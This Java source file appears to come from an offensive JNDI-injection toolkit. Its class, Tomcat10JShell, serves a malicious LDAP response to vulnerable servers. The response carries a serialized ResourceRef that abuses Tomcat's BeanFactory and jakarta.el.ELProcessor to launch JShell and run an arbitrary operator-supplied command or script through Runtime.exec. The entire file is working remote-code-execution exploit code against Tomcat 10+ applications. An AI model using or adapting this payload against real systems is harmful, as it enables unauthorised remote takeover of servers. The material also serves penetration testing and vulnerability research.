package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
 *  When bean is created on the server side, we can control its class name and setter methods,
 *   so we can leverage {@link jakarta.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
 *
 * @see <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">exploitation details</a>
 *
 * Requires:
 *  Tomcat 10+
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author artsploit
 * @author GEBIRGE
 */
@LdapMapping(uri = { "/o=tomcat10-jshell" })
public class Tomcat10JShell implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("Sending LDAP ResourceRef result for " + base + " with jakarta.el.ELProcessor payload");

        String payload;

        if (Config.jshellPayloadPath.isEmpty()) {
            System.out.println("Using Config.command payload");

            payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"java.lang.Runtime.getRuntime().exec(${command})\")}"
                    .replace("${command}", "\\\"" + Config.command + "\\\"");
        } else {
            System.out.println("Using payload from " + Config.jshellPayloadPath);

            String jshellScript = new String(Files.readAllBytes(Paths.get(Config.jshellPayloadPath)), StandardCharsets.UTF_8)
                    .replace("\"", "\\\"");

            payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"${script}\")}"
                    .replace("${script}", jshellScript);
        }

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String");

        ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}